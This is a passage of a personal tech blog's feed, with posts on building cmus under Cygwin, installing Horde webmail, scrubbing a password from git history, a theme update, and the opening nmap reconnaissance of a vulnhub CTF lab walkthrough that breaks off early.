&lt;span class="code-line"&gt;&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;***&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Makefile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And we just need to install the missing library using &lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt; package manager.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Now we have libmad install in &lt;code&gt;/usr/local/lib/&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id="cmus"&gt;cmus&lt;/h1&gt;
&lt;p&gt;But our installation is not completed we need to recompile
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; with the support
of this new library and if you just launch the 3 basic commands it will not
work. In fact, gcc does not search libraries in &lt;code&gt;/usr/local&lt;/code&gt; by default. We need
to add a flag at the configure step:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;.&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;configure&lt;/span&gt; &lt;span class="nv"&gt;CPPFLAGS&lt;/span&gt;&lt;span class="o"&gt;=-&lt;/span&gt;&lt;span class="nv"&gt;I&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;include&lt;/span&gt; &lt;span class="nv"&gt;LDFLAGS&lt;/span&gt;&lt;span class="o"&gt;=-&lt;/span&gt;&lt;span class="nv"&gt;L&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;lib&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;make&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;make&lt;/span&gt; &lt;span class="nv"&gt;install&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And now you can launch &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; and re-add your mp3
files and &lt;strong&gt;it works!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;You can still have some erros, mostly with the newest cygwin versions.&lt;/p&gt;
&lt;h2 id="recipe-for-target-apeo-failed"&gt;recipe for target 'ape.o' failed&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;This error was first mention by buzzbo on
&lt;a href="https://github.com/cmus/cmus/issues/343"&gt;github&lt;/a&gt; and resolved by mahkoh.
Thanks to them.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;After the &lt;code&gt;./configure&lt;/code&gt;, the &lt;code&gt;make&lt;/code&gt; may output something like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;   CC     ape.o&lt;/span&gt;
&lt;span class="code-line"&gt;In file included from ape.c:23:0:&lt;/span&gt;
&lt;span class="code-line"&gt;xmalloc.h: In function &amp;#39;xstrndup&amp;#39;:&lt;/span&gt;
&lt;span class="code-line"&gt;xmalloc.h:79:2: error: implicit declaration of function &amp;#39;strndup&amp;#39; [-Werror=implicit-function-declaration]&lt;/span&gt;
&lt;span class="code-line"&gt;  char *s = strndup(str, n);&lt;/span&gt;
&lt;span class="code-line"&gt;  ^&lt;/span&gt;
&lt;span class="code-line"&gt;xmalloc.h:79:12: warning: incompatible implicit declaration of built-in function &amp;#39;strndup&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;  char *s = strndup(str, n);&lt;/span&gt;
&lt;span class="code-line"&gt;            ^&lt;/span&gt;
&lt;span class="code-line"&gt;cc1: some warnings being treated as errors&lt;/span&gt;
&lt;span class="code-line"&gt;scripts/lib.mk:66: recipe for target &amp;#39;ape.o&amp;#39; failed&lt;/span&gt;
&lt;span class="code-line"&gt;make: *** [ape.o] Error 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This error is due to an implicit function declaration that is incorrect. Add
this after all the includes of the offending files (&lt;code&gt;xmalloc.h&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nf"&gt;strndup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="workflow-tldr"&gt;Workflow - TL;DR&lt;/h3&gt;
&lt;p&gt;Here is the &lt;a href="https://en.wikipedia.org/wiki/TL;DR"&gt;TL;DR&lt;/a&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cygwin dependencies&lt;/li&gt;
&lt;li&gt;flac-devel&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ncurses&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Install &lt;a href="http://www.underbit.com/products/mad/"&gt;libmad&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;change the &lt;code&gt;config.gess&lt;/code&gt; and &lt;code&gt;config.sub&lt;/code&gt; files with the one from &lt;a href="http://ftp.gnu.org/gnu/config/README"&gt;this readme&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;patch the configuration to not use the &lt;code&gt;-fforce-mem&lt;/code&gt; option with sed: &lt;code&gt;sed -i '/-fforce-mem/d' configure&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;run the 3 classical commands:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;./configure&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make install&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Install &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; from source and add the &lt;code&gt;gcc&lt;/code&gt; flags to load libraries in /usr/local:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;./configure CPPFLAGS=-I/usr/local/include LDFLAGS=-L/usr/local/lib&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make install&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;If you run a classical linux distribution to install cmus use &lt;code&gt;aptitude install
cmus&lt;/code&gt; or &lt;code&gt;pacman -S cmus&lt;/code&gt;. It is so much easier!&lt;/em&gt;&lt;/p&gt;
&lt;h1 id="disqus-comments"&gt;Disqus comments&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;This is a copy of the Disqus comments for this page&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;snapdeus - 2019&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thanks for this guide! I've been referring to it frequently.&lt;/p&gt;
&lt;p&gt;I'm running into an issue trying to get .m4a files to work in cmus.&lt;/p&gt;
&lt;p&gt;Have you had success with this?&lt;/p&gt;
&lt;p&gt;So far, I've tried including libmp4v2.dll.a in /usr/local/lib, like you did with the libmad.a library, but that did not work.&lt;/p&gt;
&lt;p&gt;I'm not aware of a good method for adding libraries to build dependencies - but that is my own fault.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;maggick - 2019&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hi snapdeus, I didn't use cmus on Windows for a while. Probably the right library to decode .m4a is missing.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Abhishek upadhyay - 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you very much for this awesome tutorial. I did exactly the same in babun and it worked! LOved it Thank you very much&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;James - 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Another post just to say thanks so much for this tutorial.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;AerialB - 2015&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you so much for this. I am forced by circumstance to use Windows atm, and although I like foobar, cmus is just the best.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Lee - 2015&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you for minimizing a serious headache! Have you managed to get flac compatability figured out? I've not had much luck.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;maggick - 2015&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you for your interest, flac compatibility is given with the flac codec package (the first one in the following capture) directly in the cygwin installer / package manager.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="cygwin package manager" src="/media/2015.01/cmus_disqus.jpg"&gt;&lt;/p&gt;</content><category term="Programming"></category><category term="cygwin"></category><category term="cmus"></category><category term="programming"></category><category term="windows"></category></entry><entry><title>Switching to Horde</title><link href="https://maggick.fr/2014/12/switching-to-horde.html" rel="alternate"></link><published>2014-12-27T00:00:00+01:00</published><updated>2014-12-27T00:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2014-12-27:/2014/12/switching-to-horde.html</id><summary type="html">&lt;p&gt;I host my own services with a web access, for my mail and calendar I used
&lt;a href="https://roundcube.org"&gt;Roundcube&lt;/a&gt; a wonderful webmail and
&lt;a href="https://agendav.org"&gt;agendav&lt;/a&gt; for my calendar. Nevertheless I am used to have
everything in one place (&lt;em&gt;thank you Google for the bad habit&lt;/em&gt;) and agendav was
no more working on my …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I host my own services with a web access, for my mail and calendar I used
&lt;a href="https://roundcube.org"&gt;Roundcube&lt;/a&gt; a wonderful webmail and
&lt;a href="https://agendav.org"&gt;agendav&lt;/a&gt; for my calendar. Nevertheless I am used to have
everything in one place (&lt;em&gt;thank you Google for the bad habit&lt;/em&gt;) and agendav was
no more working on my server. Therefore I decided to switch to Horde, a all in
one webmail which manage e-mails, calendars, contacts, notes and todo lists.&lt;/p&gt;
&lt;p&gt;Horde is written in PHP and is accessible using Pear (PHP Extension and
Application Repository).&lt;/p&gt;
&lt;h1 id="installing-horde"&gt;Installing Horde&lt;/h1&gt;
&lt;p&gt;Let us see how to install Horde.&lt;/p&gt;
&lt;h2 id="necessary-packages"&gt;Necessary packages&lt;/h2&gt;
&lt;p&gt;First of all some dependencies should be meet. Considering you are on Debian
and using &lt;code&gt;apt-get&lt;/code&gt; you may run the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt-get install php5-sasl php5-intl libssh2-php php5-curl php-http php5-xmlrpc php5-geoip php5-ldap php5-memcache php5-memcached php5-tidy&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="pear-install"&gt;Pear install&lt;/h2&gt;
&lt;p&gt;We want to use Pear to get the last version of Horde. So we add the channel, the
Horde role, and we install Horde.
You will be prompt with the question &lt;code&gt;Filesystem installation for base Horde
application: /var/www/horde&lt;/code&gt; you can change this location the only
constrain to configure your web server (Apache, Nginx, or whatever) in order to
make this folder accessible.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pear channel-discover pear.horde.org&lt;/span&gt;
&lt;span class="code-line"&gt;pear install horde/horde_role&lt;/span&gt;
&lt;span class="code-line"&gt;pear run-scripts horde/horde_role&lt;/span&gt;
&lt;span class="code-line"&gt;pear install -a -B horde/webmail&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="database-creation"&gt;Database creation&lt;/h2&gt;
&lt;p&gt;Horde use a database to store your calendars, contact, task lists and
notes. Nevertheless the script does not create this database. Therefore we must
do it manually for instance with the following commands and a MySQL database:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;mysql&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;CREATE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;DATABASE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;horde&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="k"&gt;GRANT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;ALL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;ON&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;horde&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;TO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;horde&lt;/span&gt;&lt;span class="nv"&gt;@localhost&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IDENTIFIED&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;BY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PASSWORD&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;FLUSH&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;PRIVILEGES&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You'll be asked the following questions:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;What database backend should we use? &lt;em&gt;mysql&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Request persistent connections? &lt;em&gt;no&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Username to connect to the database as: &lt;em&gt;The username you set in the previous step&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Password to connect with: &lt;em&gt;The password you set in the previous step&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;How should we connect to the database? &lt;em&gt;unix&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Location of UNIX socket: &lt;em&gt;Just press [enter]&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Database name to use: &lt;em&gt;The database name you set in the previous step&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Internally used charset: &lt;em&gt;utf-8&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Use SSL to connect to the server: &lt;em&gt;no&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Certification Authority to use for SSL connection: &lt;em&gt;Just press [enter]&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Split reads to a different server? &lt;em&gt;false&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Filesystem installation for base Horde application: &lt;em&gt;/var/www/horde&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Specify an existing mail user who you want to give administrator permissions (optional): &lt;em&gt;user@domain.com&lt;/em&gt; This user will have access to the administration interface within horde.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is all an you should get access to the horde interface.&lt;/p&gt;
&lt;h1 id="activating-the-exchange-server"&gt;Activating the exchange server&lt;/h1&gt;
&lt;p&gt;The administrator user will have a lot of options one of them is the activation
of the exchange server.&lt;/p&gt;
&lt;p&gt;That is all for this article about Horde, the install process can be found on
&lt;a href="https://www.maggick.fr/notes/#!server/horde.md"&gt;the notes part of my website&lt;/a&gt;.&lt;/p&gt;</content><category term="misc"></category><category term="server"></category><category term="mail"></category><category term="misc"></category></entry><entry><title>Git, remove unwanted data from history</title><link href="https://maggick.fr/2014/11/git-remove-unwanted-data-from-history.html" rel="alternate"></link><published>2014-11-23T00:00:00+01:00</published><updated>2014-11-23T00:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2014-11-23:/2014/11/git-remove-unwanted-data-from-history.html</id><summary type="html">&lt;p&gt;Recently I put unwanted data (a password) in one of my git commit.
This commit was not push to an public server (like github or bitbucket)
therefore there was no real security breach other than my git history.&lt;/p&gt;
&lt;p&gt;The problem was to remove the data by rewriting the git history …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Recently I put unwanted data (a password) in one of my git commit.
This commit was not push to an public server (like github or bitbucket)
therefore there was no real security breach other than my git history.&lt;/p&gt;
&lt;p&gt;The problem was to remove the data by rewriting the git history, I search on the
internet and found and interesting command using git filter-branch
To rewrite the git history use the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git filter-branch --tree-filter &amp;#39;git ls-files -z &amp;quot;*.py&amp;quot; |xargs -0 perl -p -i -e &amp;quot;s#(PASSWORD1|PASSWORD2)#youPassowrd#g&amp;quot;&amp;#39; -- --all&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This command will just change the history of python files (.py) and replace
"PASSWORD1" and "PASSWORD2" whit "youPassword".&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WARNING&lt;/strong&gt; rewriting git history is dangerous, make a backup before doing anything.&lt;/p&gt;
&lt;p&gt;You can found a short version in &lt;a href="https://maggick.fr/pages/git-tricks.html"&gt;my notes&lt;/a&gt;.&lt;/p&gt;</content><category term="Programming"></category><category term="git"></category><category term="programming"></category><category term="leak"></category></entry><entry><title>Blog changes</title><link href="https://maggick.fr/2014/10/blog-changes.html" rel="alternate"></link><published>2014-10-27T00:00:00+01:00</published><updated>2014-10-27T00:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2014-10-27:/2014/10/blog-changes.html</id><summary type="html">&lt;p&gt;Short news from by blog:&lt;/p&gt;
&lt;p&gt;Yesterday I publish my blog with a brand new theme.
The main reason is to not have the classical bootstrap theme like everybody
else. Nevertheless I am no graphic artist that is why I use a theme designed by
someone else.&lt;/p&gt;
&lt;p&gt;The theme is based …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Short news from by blog:&lt;/p&gt;
&lt;p&gt;Yesterday I publish my blog with a brand new theme.
The main reason is to not have the classical bootstrap theme like everybody
else. Nevertheless I am no graphic artist that is why I use a theme designed by
someone else.&lt;/p&gt;
&lt;p&gt;The theme is based on Maggner theme, created by Templateify and adapted to
pelican by &lt;a href="https://github.com/kplaube/maggner-pelican"&gt;Klaus Laube&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For the moment there is some minors problems :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The twitter and google+ buttons at the bottoms of articles are in Espagnoles
    (or something similar)&lt;/li&gt;
&lt;li&gt;I want to add some links in the menu to have links to my &lt;a href="https://www.maggick.fr"&gt;home
    page&lt;/a&gt; and to my &lt;a href="https://maggick.fr/notes"&gt;notes&lt;/a&gt;
    but this is not working for the moment&lt;/li&gt;
&lt;li&gt;The pictures in the article does not seems to work&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I will try to fix this problems in the next few weeks, in the same time I will
add images to each article already published and mostly refocus on the articles
in order to write new ones.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Edit:&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;29/10/14: I changed the social button language for English nevertheless the
    Facebook button is not present&lt;/li&gt;
&lt;/ul&gt;</content><category term="misc"></category><category term="blog"></category><category term="misc"></category></entry><entry><title>LAMPSecurity: CTF4</title><link href="https://maggick.fr/2014/08/lampsecurity-ctf4.html" rel="alternate"></link><published>2014-08-29T00:00:00+02:00</published><updated>2014-08-29T00:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2014-08-29:/2014/08/lampsecurity-ctf4.html</id><summary type="html">&lt;p&gt;I start the LAMPSecurity CTF4 challenge of vulnhub
&lt;a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/"&gt;available here&lt;/a&gt;.
The goal is to get a root shell on the server.&lt;/p&gt;
&lt;h1 id="discovery"&gt;Discovery&lt;/h1&gt;
&lt;p&gt;First of all we need to determine the IP address of the server.
Since we launch it in a bridged virtual machine the local router got the IP …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I start the LAMPSecurity CTF4 challenge of vulnhub
&lt;a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/"&gt;available here&lt;/a&gt;.
The goal is to get a root shell on the server.&lt;/p&gt;
&lt;h1 id="discovery"&gt;Discovery&lt;/h1&gt;
&lt;p&gt;First of all we need to determine the IP address of the server.
Since we launch it in a bridged virtual machine the local router got the IP
address in the DHCP logs. We simply found the most recent one. For me it is
&lt;code&gt;192.168.1.56&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id="nmap"&gt;Nmap&lt;/h2&gt;
&lt;p&gt;Let start with a simple nmap&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;#nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;oA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ctf4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.1.56&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;6.47&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initiated&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Thu&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2014&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;as&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;oA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ctf4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.1.56&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.1.56&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.00058&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;latency&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ow"&gt;Not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;shown&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;996&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;filtered&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ports&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;STATE&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;SERVICE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VERSION&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
